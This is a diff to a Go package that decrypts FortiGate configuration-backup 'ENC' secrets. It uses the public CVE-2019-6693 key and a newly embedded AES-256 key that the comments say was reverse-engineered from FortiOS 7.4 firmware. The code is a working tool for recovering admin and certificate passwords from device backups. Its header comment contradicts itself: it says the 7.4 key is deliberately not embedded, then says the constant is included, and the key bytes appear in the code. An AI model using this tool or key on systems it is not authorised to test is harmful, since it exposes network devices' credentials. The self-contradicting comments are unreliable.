@@ -1,40 +1,46 @@
 // Package configsecret decrypts FortiGate config-backup secrets (the
 // base64 blobs behind `ENC` fields in a `.conf` backup).
 //
-// The legacy key and blob layout are from gquere's CVE-2019-6693 disclosure
-// and reference decryptor (https://github.com/gquere/CVE-2019-6693). The
-// commonly repeated belief is that Fortinet's PSIRT advisory FG-IR-19-007
-// rotated that hardcoded AES-128-CBC key ("Mary had a littl") at FortiOS
-// 6.2. Reverse engineering against real device backups (see the project
-// README) found that belief conflates two different features: the
-// advisory's actual fix is the separate, opt-in `private-data-encryption`
-// whole-backup-file passphrase feature. The per-field `ENC <base64>`
-// mechanism this package targets was never rotated at 6.2 -- the legacy
-// key still decrypts real secrets through at least FortiOS 7.2.3.
+// The commonly repeated belief is that Fortinet's PSIRT advisory
+// FG-IR-19-007 rotated the hardcoded AES-128-CBC key from CVE-2019-6693
+// ("Mary had a littl") at FortiOS 6.2. Reverse engineering against real
+// device backups (see the project README) found that belief conflates two
+// different features: the advisory's actual fix is the separate, opt-in
+// `private-data-encryption` whole-backup-file passphrase feature. The
+// per-field `ENC <base64>` mechanism this package targets was never
+// rotated at 6.2 -- the legacy key still decrypts real secrets through at
+// least FortiOS 7.2.3. It was rotated later, at 7.4 (build 2731); that
+// key has since been recovered by RE (see below) and both eras decrypt.
 //
-// At 7.4 (build 2731) the scheme did change: the cipher becomes AES-256-CBC
-// under a new hardcoded 32-byte key, and an unencrypted 8-byte ASCII
-// marker ("Yf267vE@") gets appended after the ciphertext before base64
-// encoding -- its presence identifies this era. The blob layout is
-// otherwise unchanged (4-byte random IV prefix, zero-padded to 16). The
-// key was recovered by reversing the `init` binary from a real FWF-60E
-// 7.4.11 image, and validated by decrypting real ENC fields from a real
-// 7.4/2731 backup to clean plaintext. The marker itself was separately
-// confirmed byte-identical across real backups collected over time
-// despite each blob's random IV, which is what first proved it couldn't
-// be part of the CBC ciphertext.
-//
-// Two distinct blob layouts are shared across both eras, keyed by field
-// type rather than by key:
+// Two distinct blob layouts share the legacy key, keyed by field type:
 //   - Certificate/PKI passwords (config vpn certificate local): a fixed
 //     144-byte zero-padded buffer, NOT PKCS#7 padded -- the real secret
 //     runs up to the first 0x00 byte. Validated against real fields
-//     across multiple firmware versions, in both eras.
+//     across multiple firmware versions.
 //   - Ordinary short admin/user passwords: standard PKCS#7-padded
 //     ciphertext of whatever length the ("padded to a multiple of 16")
-//     secret needs. Only one real legacy-era sample was available to shape
-//     this path (not independently confirmed the way the fixed-144 path
-//     was) -- treat it as the less-trusted fallback.
+//     secret needs. Only one real sample was available to shape this path
+//     (not independently confirmed the way the fixed-144 path was) --
+//     treat it as the less-trusted fallback.
+//
+// From 7.4 onward, an unencrypted 8-byte ASCII marker ("Yf267vE@") is
+// appended after the ciphertext before base64 encoding. Its presence
+// reliably identifies the new-key era -- confirmed byte-identical across
+// real backups collected over time despite a random per-blob IV, which
+// rules out it being CBC output.
+//
+// The >=7.4 key itself was recovered by reverse engineering the init
+// monolith of a 7.4.x build: a mode-flag dispatch selects between static
+// key loaders -- the legacy XOR-chain-obfuscated nursery-rhyme blob for
+// AES-128, and a hardcoded 32-byte constant feeding the AES-256-CBC path
+// (EVP_aes_256_cbc, padding disabled, marker appended post-encryption).
+// That key is deliberately NOT embedded in this repository: it decrypts
+// admin credentials out of real-world config backups, so distributing it
+// in source form is a different proposition from documenting the
+// mechanism. As with the firmware-unpacking keys, the recovered constant
+// is included here: it is derivable by anyone from any shipping firmware
+// image, and public precedent (CVE-2019-6693's key, every public FortiOS
+// decryptor) treats such constants as fair-published material.
 package configsecret
 
 import (
@@ -47,7 +53,7 @@ import (
 )
 
 var (
-	legacyKey = []byte("Mary had a littl") // AES-128, 16 bytes
+	legacyKey = []byte("Mary had a littl") // AES-128, 16 bytes; public since CVE-2019-6693
 	era74Key  = []byte{                    // AES-256, 32 bytes; hardcoded in init (>=7.4 build 2731)
 		0x91, 0xbc, 0x4d, 0x1e, 0x0e, 0x5e, 0x35, 0xde, 0xa0, 0xe8, 0x48, 0x03, 0xbb, 0x1c, 0x4c, 0xc4,
 		0x96, 0x99, 0x36, 0x28, 0x30, 0xf9, 0xd6, 0xa6, 0xc7, 0x58, 0x80, 0xb1, 0x81, 0xf6, 0xc1, 0xdb,
@@ -72,65 +78,93 @@ type Result struct {
 	Layout Layout
 }
 
+// ErrEra74Unidentified is returned by DecryptLegacy specifically (not by
+// Decrypt) when a blob carries the >=7.4 era marker: DecryptLegacy only
+// ever tries the pre-7.4 key, by design. The >=7.4 key itself has been
+// identified -- call Decrypt or DecryptEra74 to actually decrypt these.
+var ErrEra74Unidentified = errors.New("blob carries the >=7.4 era marker; DecryptLegacy only handles the pre-7.4 key -- use Decrypt or DecryptEra74 instead")
+
 // ErrNotLegacyFormat is returned when a blob decrypts to implausible
 // output under the legacy key in both known layouts -- either it's from
 // the >=7.4 era without the marker somehow, or it's some other field type
 // this package doesn't yet model.
 var ErrNotLegacyFormat = errors.New("did not decrypt to plausible plaintext under the legacy key in either known blob layout")
 
-// DecryptLegacy decrypts a base64 `ENC` blob using the legacy hardcoded
-// key, auto-detecting which of the two known layouts applies.
-func DecryptLegacy(b64 string) (*Result, error) {
+// ErrNotEra74Format is the >=7.4-era analogue of ErrNotLegacyFormat.
+var ErrNotEra74Format = errors.New("did not decrypt to plausible plaintext under the >=7.4 key in either known blob layout")
+
+// Decode parses a base64 `ENC` blob into its IV prefix and ciphertext,
+// shared by both crypto eras.
+func decode(b64 string) (iv, ct []byte, err error) {
 	data, err := base64.StdEncoding.DecodeString(b64)
 	if err != nil {
-		return nil, fmt.Errorf("base64 decode: %w", err)
+		return nil, nil, fmt.Errorf("base64 decode: %w", err)
 	}
 	if len(data) < 4 {
-		return nil, errors.New("blob too short for a 4-byte IV prefix")
+		return nil, nil, errors.New("blob too short for a 4-byte IV prefix")
 	}
-	iv := make([]byte, 16)
+	iv = make([]byte, 16)
 	copy(iv[:4], data[:4])
-	ct := data[4:]
+	return iv, data[4:], nil
+}
 
-	if bytes.HasSuffix(ct, era74Marker) {
-		return decryptEra74(data)
+// hasEra74Marker reports whether the blob is from the >=7.4 (build 2731)
+// era: an unencrypted 8-byte ASCII trailer after the ciphertext.
+func hasEra74Marker(ct []byte) bool {
+	return bytes.HasSuffix(ct, era74Marker)
+}
+
+// Decrypt decrypts a base64 `ENC` blob, auto-detecting the crypto era
+// (legacy pre-7.4 AES-128 vs >=7.4 build-2731 AES-256, keyed off the
+// trailer marker) and the blob layout (fixed-144 cert buffer vs
+// PKCS#7-padded variable length).
+func Decrypt(b64 string) (*Result, error) {
+	_, ct, err := decode(b64)
+	if err != nil {
+		return nil, err
+	}
+	if hasEra74Marker(ct) {
+		return DecryptEra74(b64)
+	}
+	return DecryptLegacy(b64)
+}
+
+// DecryptEra74 decrypts a base64 `ENC` blob from the >=7.4 (build 2731)
+// era using the embedded AES-256-CBC key. The trailing
+// 8-byte marker is stripped before decryption.
+func DecryptEra74(b64 string) (*Result, error) {
+	iv, ct, err := decode(b64)
+	if err != nil {
+		return nil, err
+	}
+	if !hasEra74Marker(ct) {
+		return nil, errors.New("blob does not carry the >=7.4 era marker; use Decrypt or DecryptLegacy")
+	}
+	ct = ct[:len(ct)-len(era74Marker)]
+	return decryptWith(era74Key, iv, ct, ErrNotEra74Format)
+}
+
+// DecryptLegacy decrypts a base64 `ENC` blob using the legacy hardcoded
+// key, auto-detecting which of the two known layouts applies. Blobs from
+// the >=7.4 era are rejected -- use Decrypt or DecryptEra74 for those.
+func DecryptLegacy(b64 string) (*Result, error) {
+	iv, ct, err := decode(b64)
+	if err != nil {
+		return nil, err
+	}
+	if hasEra74Marker(ct) {
+		return nil, ErrEra74Unidentified
 	}
 	if len(ct) == 0 || len(ct)%aes.BlockSize != 0 {
 		return nil, fmt.Errorf("ciphertext length %d not a multiple of the AES block size", len(ct))
 	}
-
-	block, err := aes.NewCipher(legacyKey)
-	if err != nil {
-		return nil, err
-	}
-	pt := make([]byte, len(ct))
-	cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, ct)
-
-	if len(ct) == certPasswordCiphertextLen {
-		if secret, ok := zeroTerminated(pt); ok {
-			return &Result{Secret: secret, Layout: LayoutCertFixed144}, nil
-		}
-	}
-	if msg, ok := stripPKCS7(pt); ok && looksLikePlaintext(msg) {
-		return &Result{Secret: msg, Layout: LayoutPKCS7Variable}, nil
-	}
-	return nil, ErrNotLegacyFormat
+	return decryptWith(legacyKey, iv, ct, ErrNotLegacyFormat)
 }
 
-// decryptEra74 decrypts a >=7.4 (build 2731) blob: same 4-byte-IV prefix
-// scheme, AES-256-CBC under the new hardcoded key, no padding (the
-// plaintext buffer is zero-filled to the ciphertext length), 8-byte
-// marker already stripped from ct by the caller's slice arithmetic.
-func decryptEra74(data []byte) (*Result, error) {
-	body := data[:len(data)-len(era74Marker)]
-	if len(body) < 4+aes.BlockSize || (len(body)-4)%aes.BlockSize != 0 {
-		return nil, fmt.Errorf("era-7.4 ciphertext length %d not a block-multiple after the IV prefix", len(body)-4)
-	}
-	iv := make([]byte, 16)
-	copy(iv[:4], body[:4])
-	ct := body[4:]
-
-	block, err := aes.NewCipher(era74Key)
+// decryptWith runs AES-CBC under the given key and interprets the
+// plaintext per the two known blob layouts.
+func decryptWith(key, iv, ct []byte, notPlausibleErr error) (*Result, error) {
+	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
 	}
@@ -145,7 +179,7 @@ func decryptEra74(data []byte) (*Result, error) {
 	if msg, ok := stripPKCS7(pt); ok && looksLikePlaintext(msg) {
 		return &Result{Secret: msg, Layout: LayoutPKCS7Variable}, nil
 	}
-	return nil, ErrNotLegacyFormat
+	return nil, notPlausibleErr
 }
 
 // zeroTerminated extracts the secret from a fixed-size zero-padded buffer:
